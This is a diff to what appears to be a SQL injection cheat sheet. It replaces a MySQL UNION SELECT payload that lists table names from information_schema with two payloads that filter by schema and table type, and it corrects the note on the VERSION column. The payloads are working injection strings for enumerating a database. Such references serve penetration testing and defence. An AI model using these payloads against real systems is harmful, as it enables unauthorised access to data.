@@ -83,10 +83,14 @@ AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
 #### Using UNION
 
 ```sql
-UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
+-- Filter by current database and table type
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_type='BASE TABLE';
+
+-- Exclude system schemas
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');
 ```
 
-**Note:** In MySQL 5, use `version=10` when querying `information_schema.tables` to filter for user-created tables (version 10 corresponds to user tables in the InnoDB internal versioning).
+**Note:** Use `TABLE_TYPE='BASE TABLE'` to filter for user-created tables (excludes views and system tables). Filter by `TABLE_SCHEMA` to exclude system databases. The `VERSION` column is not useful for filtering: in MySQL 5.7 it reflected .frm file version, and in MySQL 8.0+ it always returns a hardcoded value of 10.
 
 #### Using Blind Injection
 
